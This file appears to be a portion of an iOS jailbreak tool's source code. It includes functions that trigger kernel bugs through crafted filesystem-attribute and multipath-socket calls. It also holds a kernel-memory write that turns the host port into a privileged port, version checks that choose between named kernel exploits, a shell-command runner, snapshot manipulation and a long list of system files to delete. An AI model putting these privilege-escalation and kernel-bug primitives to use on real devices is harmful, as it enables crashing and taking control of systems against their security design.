                                       (uint32_t)inputScalarCnt,
                                       inputStruct,
                                       inputStructCnt,
                                       outputScalar,
                                       &outputScalarCnt,
                                       outputStruct,
                                       &outputStructCnt);
        
        printf("%x\n", err);
    };
    
    return;
}

int vfs_die() {
    int fd = open("/", O_RDONLY);
    if (fd == -1) {
        perror("unable to open fs root\n");
        return 0;
    }
    
    struct attrlist al = {0};
    
    al.bitmapcount = ATTR_BIT_MAP_COUNT;
    al.volattr = 0xfff;
    al.commonattr = ATTR_CMN_RETURNED_ATTRS;
    
    size_t attrBufSize = 16;
    void* attrBuf = malloc(attrBufSize);
    int options = 0;
    
    int err = fgetattrlist(fd, &al, attrBuf, attrBufSize, options);
    printf("err: %d\n", err);
    return 0;
}

#define AF_MULTIPATH 39

int mptcp_die() {
    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("socket failed\n");
        perror("");
        return 0;
    }
    printf("got socket: %d\n", sock);
    
    struct sockaddr* sockaddr_src = malloc(256);
    memset(sockaddr_src, 'A', 256);
    sockaddr_src->sa_len = 220;
    sockaddr_src->sa_family = 'B';
    
    struct sockaddr* sockaddr_dst = malloc(256);
    memset(sockaddr_dst, 'A', 256);
    sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
    sockaddr_dst->sa_family = AF_INET6;
    
    sa_endpoints_t eps = {0};
    eps.sae_srcif = 0;
    eps.sae_srcaddr = sockaddr_src;
    eps.sae_srcaddrlen = 220;
    eps.sae_dstaddr = sockaddr_dst;
    eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
    
    int err = connectx(
                       sock,
                       &eps,
                       SAE_ASSOCID_ANY,
                       0,
                       NULL,
                       0,
                       NULL,
                       NULL);
    
    printf("err: %d\n", err);
    
    close(sock);
    
    return 0;
}

#define IO_ACTIVE 0x80000000

#define IKOT_HOST 3
#define IKOT_HOST_PRIV 4

void make_host_into_host_priv() {
    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
    uint32_t old = rk32(hostport_addr);
    printf("old host type: 0x%08x\n", old);
    wk32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
}

mach_port_t try_restore_port() {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = host_get_special_port(mach_host_self(), 0, 4, &port);
    if (err == KERN_SUCCESS && port != MACH_PORT_NULL) {
        printf("got persisted port!\n");
        // make sure rk64 etc use this port
        return port;
    }
    printf("unable to retrieve persisted port\n");
    return MACH_PORT_NULL;
}

// https://github.com/tihmstar/doubleH3lix/blob/4428c660832e98271f5d82f7a9c67e842b814621/doubleH3lix/jailbreak.mm#L645

extern char* const* environ;
int easyPosixSpawn(NSURL *launchPath,NSArray *arguments) {
    NSMutableArray *posixSpawnArguments=[arguments mutableCopy];
    [posixSpawnArguments insertObject:[launchPath lastPathComponent] atIndex:0];
    
    int argc=(int)posixSpawnArguments.count+1;
    printf("Number of posix_spawn arguments: %d\n",argc);
    char **args=(char**)calloc(argc,sizeof(char *));
    
    for (int i=0; i<posixSpawnArguments.count; i++)
        args[i]=(char *)[posixSpawnArguments[i]UTF8String];
    
    printf("File exists at launch path: %d\n",[[NSFileManager defaultManager]fileExistsAtPath:launchPath.path]);
    printf("Executing %s: %s\n",launchPath.path.UTF8String,arguments.description.UTF8String);
    
    posix_spawn_file_actions_t action;
    posix_spawn_file_actions_init(&action);
    
    pid_t pid;
    int status;
    status = posix_spawn(&pid, launchPath.path.UTF8String, &action, NULL, args, environ);
    
    if (status == 0) {
        if (waitpid(pid, &status, 0) != -1) {
            // wait
        }
    }
    
    posix_spawn_file_actions_destroy(&action);
    free(args);
    
    return status;
}

int is_symlink(const char *filename) {
    int rv = 0;
    struct stat buf;
    rv = lstat(filename, &buf);
    if (!(rv == 0))
        return -1;
    rv = S_ISLNK(buf.st_mode);
    return rv;
}

int is_directory(const char *filename) {
    int rv = 0;
    struct stat buf;
    rv = lstat(filename, &buf);
    if (!(rv == 0))
        return -1;
    rv = S_ISDIR(buf.st_mode);
    return rv;
}

int snapshot_rename(const char *vol, const char *from, const char *to) {
    int rv = 0;
    int fd = 0;
    fd = open(vol, O_RDONLY, 0);
    rv = fs_snapshot_rename(fd, from, to, 0);
    close(fd);
    return rv;
}

int snapshot_create(const char *vol, const char *name) {
    int rv = 0;
    int fd = 0;
    fd = open(vol, O_RDONLY, 0);
    rv = fs_snapshot_create(fd, name, 0);
    close(fd);
    return rv;
}

int snapshot_delete(const char *vol, const char *name) {
    int rv = 0;
    int fd = 0;
    fd = open(vol, O_RDONLY, 0);
    rv = fs_snapshot_delete(fd, name, 0);
    close(fd);
    return rv;
}

int snapshot_revert(const char *vol, const char *name) {
    int rv = 0;
    int fd = 0;
    fd = open(vol, O_RDONLY, 0);
    rv = fs_snapshot_revert(fd, name, 0);
    close(fd);
    return rv;
}

int snapshot_mount(const char *vol, const char *name, const char *dir) {
    int rv = 0;
    rv = spawnAndShaihuludAndWait("/sbin/mount_apfs", "-s", (char *)name, (char *)vol, (char *)dir, NULL);
    return rv;
}

double uptime() {
    struct timeval boottime;
    size_t len = sizeof(boottime);
    int mib[2] = {CTL_KERN, KERN_BOOTTIME};
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) < 0) {
        return -1.0;
    }
    time_t bsec = boottime.tv_sec, csec = time(NULL);
    return difftime(csec, bsec);
}

int isJailbroken() {
    struct utsname u = { 0 };
    uname(&u);
    return (strstr(u.version, DEFAULT_VERSION_STRING) != NULL);
}

int isSupportedByExploit(int exploit) {
    struct utsname u = { 0 };
    const char **versions = NULL;
    switch (exploit) {
        case EMPTY_LIST: {
            versions = empty_list_supported_versions;
            break;
        }
        case MULTI_PATH: {
            versions = multi_path_supported_versions;
            break;
        }
        case ASYNC_WAKE: {
            versions = async_wake_supported_versions;
            break;
        }
        default:
            break;
    }
    if (versions != NULL) {
        uname(&u);
        while (*versions) {
            if (strstr(u.version, *versions) != NULL) {
                return 1;
            }
            versions++;
        }
    }
    return 0;
}

int hasMPTCP() {
    return [[SettingsTableViewController _provisioningProfileAtPath:[[NSBundle mainBundle] pathForResource:@"embedded" ofType:@"mobileprovision"]][@"Entitlements"][@"com.apple.developer.networking.multipath"] boolValue];
}

int selectExploit() {;
    if (isSupportedByExploit(ASYNC_WAKE) == 1) {
        return ASYNC_WAKE;
    } else if (isSupportedByExploit(MULTI_PATH) == 1 && hasMPTCP() == 1) {
        return MULTI_PATH;
    } else if (isSupportedByExploit(EMPTY_LIST) == 1) {
        return EMPTY_LIST;
    } else {
        return -1;
    }
}

int isSupported() {
    return (!(selectExploit() == -1));
}

int waitForFile(const char *filename) {
    int rv = 0;
    rv = access(filename, F_OK);
    for (int i = 0; !(i >= 100 || rv == 0); i++) {
        usleep(100000);
        rv = access(filename, F_OK);
    }
    return rv;
}

int _system(const char *cmd) {
    pid_t Pid = 0;
    int Status = 0;
    char *myenviron[] = {
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11:/usr/games",
        "PS1=\\h:\\w \\u\\$ ",
        NULL
    };
    char *argv[] = {"sh", "-c", (char *)cmd, NULL};
    posix_spawn(&Pid, "/bin/sh", NULL, NULL, argv, myenviron);
    waitpid(Pid, &Status, 0);
    return Status;
}

void setPreference(NSString *key, id object) {
    NSMutableDictionary *md = nil;
    md = [[NSMutableDictionary alloc] initWithContentsOfFile:PREFERENCES_FILE];
    if (md == nil) {
        md = [[NSMutableDictionary alloc] init];
    }
    _assert(md != nil, message);
    if (![md[key] isEqual:object]) {
        md[key] = object;
        _assert(kill(findPidOfProcess("cfprefsd"), SIGSTOP) == 0, message);
        _assert(([md writeToFile:PREFERENCES_FILE atomically:YES]) == 1, message);
        _assert(kill(findPidOfProcess("cfprefsd"), SIGKILL) == 0, message);
    }
}

/*

void loadOffsetsFromFile(const char *filename, uint64_t *kernel_base, uint64_t *kernel_slide, offsets_t offsets) {
    NSMutableDictionary *md = nil;
    md = [[NSMutableDictionary alloc] initWithContentsOfFile:@(filename)];
    assert(md != nil);
    *kernel_base = strtoull([md[@"KernelBase"] UTF8String], NULL, 16);
    LOG("kernel_base: " ADDR "\n", *kernel_base);
    _assert(ISADDR(*kernel_base), message);
    *kernel_slide = strtoull([md[@"KernelSlide"] UTF8String], NULL, 16);
    LOG("kernel_slide: " ADDR "\n", *kernel_slide);
    _assert(ISADDR(*kernel_slide), message);
    offsets.trust_chain = strtoull([md[@"TrustChain"] UTF8String], NULL, 16);
    LOG("trust_chain: " ADDR "\n", offsets.trust_chain);
    _assert(ISADDR(offsets.trust_chain), message);
    offsets.amficache = strtoull([md[@"AmfiCache"] UTF8String], NULL, 16);
    LOG("amficache: " ADDR "\n", offsets.amficache);
    _assert(ISADDR(offsets.amficache), message);
    offsets.OSBoolean_True = strtoull([md[@"OSBooleanTrue"] UTF8String], NULL, 16);
    LOG("OSBoolean_True: " ADDR "\n", offsets.OSBoolean_True);
    _assert(ISADDR(offsets.OSBoolean_True), message);
    offsets.OSBoolean_False = strtoull([md[@"OSBooleanFalse"] UTF8String], NULL, 16);
    LOG("OSBoolean_False: " ADDR "\n", offsets.OSBoolean_False);
    _assert(ISADDR(offsets.OSBoolean_False), message);
    offsets.osunserializexml = strtoull([md[@"OSUnserializeXML"] UTF8String], NULL, 16);
    LOG("osunserializexml: " ADDR "\n", offsets.osunserializexml);
    _assert(ISADDR(offsets.osunserializexml), message);
    offsets.smalloc = strtoull([md[@"Smalloc"] UTF8String], NULL, 16);
    LOG("smalloc: " ADDR "\n", offsets.smalloc);
    _assert(ISADDR(offsets.smalloc), message);
    offsets.allproc = strtoull([md[@"AllProc"] UTF8String], NULL, 16);
    LOG("allproc: " ADDR "\n", offsets.allproc);
    _assert(ISADDR(offsets.allproc), message);
    offsets.add_x0_x0_0x40_ret = strtoull([md[@"AddRetGadget"] UTF8String], NULL, 16);
    LOG("add_x0_x0_0x40_ret: " ADDR "\n", offsets.add_x0_x0_0x40_ret);
    _assert(ISADDR(offsets.add_x0_x0_0x40_ret), message);
    offsets.rootvnode = strtoull([md[@"RootVnode"] UTF8String], NULL, 16);
    LOG("rootvnode: " ADDR "\n", offsets.rootvnode);
    _assert(ISADDR(offsets.rootvnode), message);
    offsets.zone_map_ref = strtoull([md[@"ZoneMapOffset"] UTF8String], NULL, 16);
    LOG("zone_map_ref: " ADDR "\n", offsets.zone_map_ref);
    _assert(ISADDR(offsets.zone_map_ref), message);
    offsets.vfs_context_current = strtoull([md[@"VfsContextCurrent"] UTF8String], NULL, 16);
    LOG("vfs_context_current: " ADDR "\n", offsets.vfs_context_current);
    _assert(ISADDR(offsets.vfs_context_current), message);
    offsets.vnode_lookup = strtoull([md[@"VnodeLookup"] UTF8String], NULL, 16);
    LOG("vnode_lookup: " ADDR "\n", offsets.vnode_lookup);
    _assert(ISADDR(offsets.vnode_lookup), message);
    offsets.vnode_put = strtoull([md[@"VnodePut"] UTF8String], NULL, 16);
    LOG("vnode_put: " ADDR "\n", offsets.vnode_put);
    _assert(ISADDR(offsets.vnode_put), message);
    offsets.kernproc = strtoull([md[@"KernProc"] UTF8String], NULL, 16);
    LOG("kernproc: " ADDR "\n", offsets.kernproc);
    _assert(ISADDR(offsets.kernproc), message);
    offsets.v_mount = strtoull([md[@"VMount"] UTF8String], NULL, 16);
    LOG("v_mount: " ADDR "\n", offsets.v_mount);
    _assert(ISADDR(offsets.v_mount), message);
    offsets.mnt_flag = strtoull([md[@"MntFlag"] UTF8String], NULL, 16);
    LOG("mnt_flag: " ADDR "\n", offsets.mnt_flag);
    _assert(ISADDR(offsets.mnt_flag), message);
    offsets.v_specinfo = strtoull([md[@"VSpecinfo"] UTF8String], NULL, 16);
    LOG("v_specinfo: " ADDR "\n", offsets.v_specinfo);
    _assert(ISADDR(offsets.v_specinfo), message);
    offsets.si_flags = strtoull([md[@"SiFlags"] UTF8String], NULL, 16);
    LOG("si_flags: " ADDR "\n", offsets.si_flags);
    _assert(ISADDR(offsets.si_flags), message);
    offsets.v_flags = strtoull([md[@"VFlags"] UTF8String], NULL, 16);
    LOG("v_flags: " ADDR "\n", offsets.v_flags);
    _assert(ISADDR(offsets.v_flags), message);
}
 
*/

NSString *hexFromInt(NSInteger val) {
    return [NSString stringWithFormat:@"0x%lX", (long)val];
}

NSArray *getCleanUpFileList() {
    NSMutableArray *array = nil;
    array = [[NSMutableArray alloc] init];
    // Electra
    [array addObject:@"/electra"];
    [array addObject:@"/usr/lib/libjailbreak.dylib"];
    [array addObject:@"/var/mobile/test.txt"];
    [array addObject:@"/.bit_of_fun"];
    [array addObject:@"/.amfid_success"];
    [array addObject:@"/.bootstrapped_electra"];
    // Electra Bootstrap
    [array addObject:@"/Applications/Cydia.app"];
    [array addObject:@"/bin/bash"];
    [array addObject:@"/bin/bunzip2"];
    [array addObject:@"/bin/bzcat"];
    [array addObject:@"/bin/bzip2"];
    [array addObject:@"/bin/bzip2recover"];
    [array addObject:@"/bin/cat"];
    [array addObject:@"/bin/chgrp"];
    [array addObject:@"/bin/chmod"];
    [array addObject:@"/bin/chown"];
    [array addObject:@"/bin/cp"];
    [array addObject:@"/bin/date"];
    [array addObject:@"/bin/dd"];
    [array addObject:@"/bin/dir"];
    [array addObject:@"/bin/echo"];
    [array addObject:@"/bin/egrep"];
    [array addObject:@"/bin/false"];
    [array addObject:@"/bin/fgrep"];
    [array addObject:@"/bin/grep"];
    [array addObject:@"/bin/gtar"];
    [array addObject:@"/bin/gunzip"];
    [array addObject:@"/bin/gzexe"];
    [array addObject:@"/bin/gzip"];
    [array addObject:@"/bin/kill"];
    [array addObject:@"/bin/ln"];
    [array addObject:@"/bin/ls"];
    [array addObject:@"/bin/mkdir"];
    [array addObject:@"/bin/mknod"];
    [array addObject:@"/bin/mktemp"];
    [array addObject:@"/bin/mv"];
    [array addObject:@"/bin/pwd"];
    [array addObject:@"/bin/readlink"];
    [array addObject:@"/bin/rm"];
    [array addObject:@"/bin/rmdir"];
    [array addObject:@"/bin/run-parts"];
    [array addObject:@"/bin/sed"];
    [array addObject:@"/bin/sh"];
    [array addObject:@"/bin/sleep"];
    [array addObject:@"/bin/stty"];
    [array addObject:@"/bin/su"];
    [array addObject:@"/bin/sync"];
    [array addObject:@"/bin/tar"];
    [array addObject:@"/bin/touch"];
    [array addObject:@"/bin/true"];
    [array addObject:@"/bin/uname"];
    [array addObject:@"/bin/uncompress"];
    [array addObject:@"/bin/vdir"];
    [array addObject:@"/bin/zcat"];
    [array addObject:@"/bin/zcmp"];
    [array addObject:@"/bin/zdiff"];
    [array addObject:@"/bin/zegrep"];
    [array addObject:@"/bin/zfgrep"];
    [array addObject:@"/bin/zforce"];
    [array addObject:@"/bin/zgrep"];
    [array addObject:@"/bin/zless"];
    [array addObject:@"/bin/zmore"];
    [array addObject:@"/bin/znew"];
    [array addObject:@"/boot"];
    [array addObject:@"/lib"];
    [array addObject:@"/Library/dpkg"];
    [array addObject:@"/Library/LaunchDaemons"];
    [array addObject:@"/mnt"];
    [array addObject:@"/private/etc/alternatives"];
    [array addObject:@"/private/etc/apt"];
    [array addObject:@"/private/etc/default"];
    [array addObject:@"/private/etc/dpkg"];
    [array addObject:@"/private/etc/profile"];
    [array addObject:@"/private/etc/profile.d"];
    [array addObject:@"/private/etc/ssh"];
    [array addObject:@"/private/etc/ssl"];
    [array addObject:@"/private/var/backups"];
    [array addObject:@"/private/var/cache"];
    [array addObject:@"/private/var/empty"];
    [array addObject:@"/private/var/lib"];
    [array addObject:@"/private/var/local"];
    [array addObject:@"/private/var/lock"];
    [array addObject:@"/private/var/log/apt"];
    [array addObject:@"/private/var/spool"];
    [array addObject:@"/sbin/dmesg"];
    [array addObject:@"/sbin/dynamic_pager"];
    [array addObject:@"/sbin/halt"];
    [array addObject:@"/sbin/nologin"];
    [array addObject:@"/sbin/reboot"];
    [array addObject:@"/sbin/update_dyld_shared_cache"];
    [array addObject:@"/usr/bin/apt-key"];
    [array addObject:@"/usr/bin/arch"];
    [array addObject:@"/usr/bin/bashbug"];
    [array addObject:@"/usr/bin/c_rehash"];
    [array addObject:@"/usr/bin/captoinfo"];
    [array addObject:@"/usr/bin/cfversion"];
    [array addObject:@"/usr/bin/clear"];
    [array addObject:@"/usr/bin/cmp"];
    [array addObject:@"/usr/bin/db_archive"];
    [array addObject:@"/usr/bin/db_checkpoint"];
    [array addObject:@"/usr/bin/db_deadlock"];
    [array addObject:@"/usr/bin/db_dump"];
    [array addObject:@"/usr/bin/db_hotbackup"];
    [array addObject:@"/usr/bin/db_load"];
    [array addObject:@"/usr/bin/db_log_verify"];
    [array addObject:@"/usr/bin/db_printlog"];
    [array addObject:@"/usr/bin/db_recover"];
    [array addObject:@"/usr/bin/db_replicate"];
    [array addObject:@"/usr/bin/db_sql_codegen"];
    [array addObject:@"/usr/bin/db_stat"];
    [array addObject:@"/usr/bin/db_tuner"];
    [array addObject:@"/usr/bin/db_upgrade"];
    [array addObject:@"/usr/bin/db_verify"];
    [array addObject:@"/usr/bin/dbsql"];
    [array addObject:@"/usr/bin/df"];
    [array addObject:@"/usr/bin/diff"];
    [array addObject:@"/usr/bin/diff3"];
    [array addObject:@"/usr/bin/dirname"];
    [array addObject:@"/usr/bin/dpkg"];
    [array addObject:@"/usr/bin/dpkg-architecture"];
    [array addObject:@"/usr/bin/dpkg-buildflags"];
    [array addObject:@"/usr/bin/dpkg-buildpackage"];
    [array addObject:@"/usr/bin/dpkg-checkbuilddeps"];
    [array addObject:@"/usr/bin/dpkg-deb"];
    [array addObject:@"/usr/bin/dpkg-distaddfile"];
    [array addObject:@"/usr/bin/dpkg-divert"];
    [array addObject:@"/usr/bin/dpkg-genbuildinfo"];
    [array addObject:@"/usr/bin/dpkg-genchanges"];
    [array addObject:@"/usr/bin/dpkg-gencontrol"];
    [array addObject:@"/usr/bin/dpkg-gensymbols"];
    [array addObject:@"/usr/bin/dpkg-maintscript-helper"];
    [array addObject:@"/usr/bin/dpkg-mergechangelogs"];
    [array addObject:@"/usr/bin/dpkg-name"];
    [array addObject:@"/usr/bin/dpkg-parsechangelog"];
    [array addObject:@"/usr/bin/dpkg-query"];
    [array addObject:@"/usr/bin/dpkg-scanpackages"];
    [array addObject:@"/usr/bin/dpkg-scansources"];
    [array addObject:@"/usr/bin/dpkg-shlibdeps"];
    [array addObject:@"/usr/bin/dpkg-source"];
    [array addObject:@"/usr/bin/dpkg-split"];
    [array addObject:@"/usr/bin/dpkg-statoverride"];
    [array addObject:@"/usr/bin/dpkg-trigger"];
    [array addObject:@"/usr/bin/dpkg-vendor"];
    [array addObject:@"/usr/bin/find"];
    [array addObject:@"/usr/bin/getconf"];
    [array addObject:@"/usr/bin/getty"];
    [array addObject:@"/usr/bin/gpg"];
    [array addObject:@"/usr/bin/gpg-zip"];
    [array addObject:@"/usr/bin/gpgsplit"];
    [array addObject:@"/usr/bin/gpgv"];
    [array addObject:@"/usr/bin/gssc"];
    [array addObject:@"/usr/bin/hostinfo"];
    [array addObject:@"/usr/bin/infocmp"];
    [array addObject:@"/usr/bin/infotocap"];
    [array addObject:@"/usr/bin/iomfsetgamma"];
    [array addObject:@"/usr/bin/killall"];
    [array addObject:@"/usr/bin/ldrestart"];
    [array addObject:@"/usr/bin/locate"];
    [array addObject:@"/usr/bin/login"];
    [array addObject:@"/usr/bin/lzcat"];
    [array addObject:@"/usr/bin/lzcmp"];
    [array addObject:@"/usr/bin/lzdiff"];
    [array addObject:@"/usr/bin/lzegrep"];
    [array addObject:@"/usr/bin/lzfgrep"];
    [array addObject:@"/usr/bin/lzgrep"];
    [array addObject:@"/usr/bin/lzless"];
    [array addObject:@"/usr/bin/lzma"];
    [array addObject:@"/usr/bin/lzmadec"];
    [array addObject:@"/usr/bin/lzmainfo"];
    [array addObject:@"/usr/bin/lzmore"];
    [array addObject:@"/usr/bin/ncurses6-config"];
    [array addObject:@"/usr/bin/ncursesw6-config"];
    [array addObject:@"/usr/bin/openssl"];
    [array addObject:@"/usr/bin/pagesize"];
    [array addObject:@"/usr/bin/passwd"];
    [array addObject:@"/usr/bin/renice"];
    [array addObject:@"/usr/bin/reset"];
    [array addObject:@"/usr/bin/sbdidlaunch"];
    [array addObject:@"/usr/bin/sbreload"];
    [array addObject:@"/usr/bin/scp"];
    [array addObject:@"/usr/bin/script"];
    [array addObject:@"/usr/bin/sdiff"];
    [array addObject:@"/usr/bin/sftp"];
    [array addObject:@"/usr/bin/sort"];
    [array addObject:@"/usr/bin/ssh"];
    [array addObject:@"/usr/bin/ssh-add"];
    [array addObject:@"/usr/bin/ssh-agent"];
    [array addObject:@"/usr/bin/ssh-keygen"];
    [array addObject:@"/usr/bin/ssh-keyscan"];
    [array addObject:@"/usr/bin/sw_vers"];
    [array addObject:@"/usr/bin/tabs"];
    [array addObject:@"/usr/bin/tar"];
    [array addObject:@"/usr/bin/tic"];
    [array addObject:@"/usr/bin/time"];
    [array addObject:@"/usr/bin/toe"];
    [array addObject:@"/usr/bin/tput"];
    [array addObject:@"/usr/bin/tset"];
    [array addObject:@"/usr/bin/uicache"];
    [array addObject:@"/usr/bin/uiduid"];
    [array addObject:@"/usr/bin/uiopen"];
    [array addObject:@"/usr/bin/unlzma"];
    [array addObject:@"/usr/bin/unxz"];
    [array addObject:@"/usr/bin/update-alternatives"];
    [array addObject:@"/usr/bin/updatedb"];
    [array addObject:@"/usr/bin/which"];
    [array addObject:@"/usr/bin/xargs"];
    [array addObject:@"/usr/bin/xz"];
    [array addObject:@"/usr/bin/xzcat"];
    [array addObject:@"/usr/bin/xzcmp"];
    [array addObject:@"/usr/bin/xzdec"];
    [array addObject:@"/usr/bin/xzdiff"];
    [array addObject:@"/usr/bin/xzegrep"];
    [array addObject:@"/usr/bin/xzfgrep"];
    [array addObject:@"/usr/bin/xzgrep"];
    [array addObject:@"/usr/bin/xzless"];
    [array addObject:@"/usr/bin/xzmore"];
    [array addObject:@"/usr/games"];
    [array addObject:@"/usr/include/curses.h"];
    [array addObject:@"/usr/include/db_cxx.h"];
    [array addObject:@"/usr/include/db.h"];
    [array addObject:@"/usr/include/dbsql.h"];
    [array addObject:@"/usr/include/dpkg"];
    [array addObject:@"/usr/include/eti.h"];
    [array addObject:@"/usr/include/form.h"];
    [array addObject:@"/usr/include/lzma"];
    [array addObject:@"/usr/include/lzma.h"];
    [array addObject:@"/usr/include/menu.h"];
    [array addObject:@"/usr/include/nc_tparm.h"];
    [array addObject:@"/usr/include/ncurses_dll.h"];
    [array addObject:@"/usr/include/ncurses.h"];
    [array addObject:@"/usr/include/ncursesw"];
    [array addObject:@"/usr/include/openssl"];
    [array addObject:@"/usr/include/panel.h"];
    [array addObject:@"/usr/include/term_entry.h"];
    [array addObject:@"/usr/include/term.h"];
    [array addObject:@"/usr/include/termcap.h"];
    [array addObject:@"/usr/include/tic.h"];
    [array addObject:@"/usr/include/unctrl.h"];
    [array addObject:@"/usr/lib/apt"];
    [array addObject:@"/usr/lib/bash"];
    [array addObject:@"/usr/lib/engines"];
    [array addObject:@"/usr/lib/libapt-inst.2.0.0.dylib"];
    [array addObject:@"/usr/lib/libapt-inst.2.0.dylib"];
    [array addObject:@"/usr/lib/libapt-inst.dylib"];
    [array addObject:@"/usr/lib/libapt-pkg.5.0.1.dylib"];
    [array addObject:@"/usr/lib/libapt-pkg.5.0.dylib"];
    [array addObject:@"/usr/lib/libapt-pkg.dylib"];
    [array addObject:@"/usr/lib/libapt-private.0.0.0.dylib"];
    [array addObject:@"/usr/lib/libapt-private.0.0.dylib"];
    [array addObject:@"/usr/lib/libcrypto.1.0.0.dylib"];
    [array addObject:@"/usr/lib/libcrypto.a"];
    [array addObject:@"/usr/lib/libcrypto.dylib"];
    [array addObject:@"/usr/lib/libdb_sql-6.2.dylib"];
    [array addObject:@"/usr/lib/libdb_sql-6.dylib"];
    [array addObject:@"/usr/lib/libdb_sql.dylib"];
    [array addObject:@"/usr/lib/libdb-6.2.dylib"];
    [array addObject:@"/usr/lib/libdb-6.dylib"];
    [array addObject:@"/usr/lib/libdb.dylib"];
    [array addObject:@"/usr/lib/libdpkg.a"];
    [array addObject:@"/usr/lib/libdpkg.la"];
    [array addObject:@"/usr/lib/liblzma.a"];
    [array addObject:@"/usr/lib/liblzma.la"];
    [array addObject:@"/usr/lib/libssl.1.0.0.dylib"];
    [array addObject:@"/usr/lib/libssl.a"];
    [array addObject:@"/usr/lib/libssl.dylib"];
    [array addObject:@"/usr/lib/pkgconfig"];
    [array addObject:@"/usr/lib/ssl"];
    [array addObject:@"/usr/lib/terminfo"];
    [array addObject:@"/usr/libexec/apt"];
    [array addObject:@"/usr/libexec/bigram"];
    [array addObject:@"/usr/libexec/code"];
    [array addObject:@"/usr/libexec/cydia"];
    [array addObject:@"/usr/libexec/dpkg"];
    [array addObject:@"/usr/libexec/frcode"];
    [array addObject:@"/usr/libexec/gnupg"];
    [array addObject:@"/usr/libexec/rmt"];
    [array addObject:@"/usr/libexec/sftp-server"];
    [array addObject:@"/usr/libexec/ssh-keysign"];
    [array addObject:@"/usr/libexec/ssh-pkcs11-helper"];
    [array addObject:@"/usr/local/lib"];
    [array addObject:@"/usr/sbin/ac"];
    [array addObject:@"/usr/sbin/accton"];
    [array addObject:@"/usr/sbin/halt"];
    [array addObject:@"/usr/sbin/iostat"];
    [array addObject:@"/usr/sbin/mkfile"];
    [array addObject:@"/usr/sbin/pwd_mkdb"];
    [array addObject:@"/usr/sbin/reboot"];
    [array addObject:@"/usr/sbin/sshd"];
    [array addObject:@"/usr/sbin/startupfiletool"];
    [array addObject:@"/usr/sbin/sysctl"];
    [array addObject:@"/usr/sbin/vifs"];
    [array addObject:@"/usr/sbin/vipw"];
    [array addObject:@"/usr/sbin/zdump"];
    [array addObject:@"/usr/sbin/zic"];
    [array addObject:@"/usr/share/bigboss"];
    [array addObject:@"/usr/share/dict"];
    [array addObject:@"/usr/share/dpkg"];
    [array addObject:@"/usr/share/gnupg"];
    [array addObject:@"/usr/share/tabset"];
    [array addObject:@"/usr/share/terminfo"];
    // Potential Manual Files
    [array addObject:@"/bin/bash"];
    [array addObject:@"/authorize.sh"];
    [array addObject:@"/Applications/jjjj.app"];
    [array addObject:@"/Applications/Extender.app"];
    [array addObject:@"/Applications/GBA4iOS.app"];
    [array addObject:@"/Applications/Filza.app"];
    [array addObject:@"/Library/dpkg"];
    [array addObject:@"/Library/Cylinder"];
    [array addObject:@"/Library/LaunchDaemons"];
    [array addObject:@"/Library/Zeppelin"];
    [array addObject:@"/etc/alternatives"];
    [array addObject:@"/etc/apt"];
    [array addObject:@"/etc/dpkg"];
    [array addObject:@"/etc/dropbear"];
    [array addObject:@"/etc/pam.d"];
    [array addObject:@"/etc/profile.d"];
    [array addObject:@"/etc/ssh"];
    [array addObject:@"/usr/include"];
    [array addObject:@"/usr/lib/apt"];
    [array addObject:@"/usr/lib/dpkg"];
    [array addObject:@"/usr/lib/pam"];
    [array addObject:@"/usr/lib/pkgconfig"];
    [array addObject:@"/usr/lib/cycript0.9"];
    [array addObject:@"/usr/libexec/cydia"];
    [array addObject:@"/usr/libexec/gnupg"];
    [array addObject:@"/usr/share/bigboss"];
    [array addObject:@"/usr/share/dpkg"];
    [array addObject:@"/usr/share/gnupg"];
    [array addObject:@"/usr/share/tabset"];
    [array addObject:@"/var/cache/apt"];
    [array addObject:@"/var/db/stash"];
    [array addObject:@"/var/lib/apt"];
    [array addObject:@"/var/lib/dpkg"];
    [array addObject:@"/var/stash"];
    [array addObject:@"/var/tweak"];
    // Electra Beta Bootstrap
    [array addObject:@"/Applications/Anemone.app"];
    [array addObject:@"/Applications/SafeMode.app"];
    [array addObject:@"/usr/lib/SBInject.dylib"];
    [array addObject:@"/usr/lib/SBInject"];
    [array addObject:@"/usr/lib/libsubstitute.0.dylib"];
    [array addObject:@"/usr/lib/libsubstitute.dylib"];
    [array addObject:@"/usr/lib/libsubstrate.dylib"];
    [array addObject:@"/usr/lib/libjailbreak.dylib"];
    [array addObject:@"/usr/bin/recache"];
    [array addObject:@"/usr/bin/killall"];
    [array addObject:@"/usr/share/terminfo"];
    [array addObject:@"/usr/libexec/sftp-server"];
    [array addObject:@"/usr/lib/SBInject.dylib"];
    [array addObject:@"/Library/Frameworks"];
    [array addObject:@"/System/Library/Themes"];
    [array addObject:@"/bootstrap"];
    [array addObject:@"/Library/Themes"];
    [array addObject:@"/usr/lib/SBInject.dylib"];
    [array addObject:@"/Library/MobileSubstrate"];
    // Filza
    [array addObject:@"/Applications/Filza.app"];
    [array addObject:@"/var/root/Library/Filza"];
    [array addObject:@"/var/root/Library/Preferences/com.tigisoftware.Filza.plist"];
    [array addObject:@"/var/root/Library/Caches/com.tigisoftware.Filza"];
    [array addObject:@"/var/mobile/Library/Filza/"];
    [array addObject:@"/var/mobile/Library/Filza/.Trash"];
    [array addObject:@"/var/mobile/Library/Filza/.Trash.metadata"];
    [array addObject:@"/var/mobile/Library/Preferences/com.tigisoftware.Filza.plist"];
    // Liberios
    [array addObject:@"/etc/motd"];
    [array addObject:@"/.cydia_no_stash"];
    [array addObject:@"/Applications/Cydia.app"];
    [array addObject:@"/usr/share/terminfo"];
    [array addObject:@"/usr/local/bin"];
    [array addObject:@"/usr/local/lib"];
    [array addObject:@"/bin/zsh"];
    [array addObject:@"/etc/profile"];
    [array addObject:@"/etc/zshrc"];
    [array addObject:@"/usr/bin/scp"];
    [array addObject:@"/jb"];
    // ToPanga
    [array addObject:@"/etc/alternatives"];
    [array addObject:@"/etc/dpkg"];
    [array addObject:@"/etc/dropbear"];
    [array addObject:@"/etc/profile"];
    [array addObject:@"/etc/zshrc"];
    [array addObject:@"/usr/bin/apt"];
    [array addObject:@"/usr/bin/apt-get"];
